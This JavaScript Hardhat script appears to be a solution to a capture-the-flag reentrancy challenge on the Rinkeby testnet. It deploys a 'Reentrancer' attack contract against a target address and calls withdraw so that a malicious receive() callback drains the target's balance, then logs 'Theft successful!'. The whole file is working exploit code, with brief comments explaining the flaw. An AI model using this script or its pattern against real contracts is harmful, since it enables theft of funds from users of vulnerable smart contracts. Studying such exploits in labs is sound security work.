const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xf1f170439b5ec3C5279Cd76bc60Dd7f05f113516'
const abi = []

async function hack(contract, signer) {
    const provider = ethers.getDefaultProvider('rinkeby');
    const amountToSteal = await provider.getBalance(contract.address);
    console.log(`Balance Before: ${ethers.utils.formatEther(amountToSteal)}`);

    // If a contract makes an external call, to an unverified address, it can't be sure what's on the other side.
    const Reentrancer = await ethers.getContractFactory('Reentrancer');
    const reentrancer = await Reentrancer.deploy(contract.address, {value: amountToSteal});
    await reentrancer.deployed();
    console.log("Reentrancer Deployed To:", reentrancer.address);

    // In this case, we create a receive() function that maliciously goes back and withdraws funds again.
    // This is possible because the contract hasn't updated the balances yet, so it thinks we still have funds to withdraw.
    const tx = await reentrancer.withdraw();
    await tx.wait();

    const afterBal = await provider.getBalance(contract.address);
    console.log(`Balance After: ${ethers.utils.formatEther(afterBal)}`);
    console.log('Theft successful!')
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})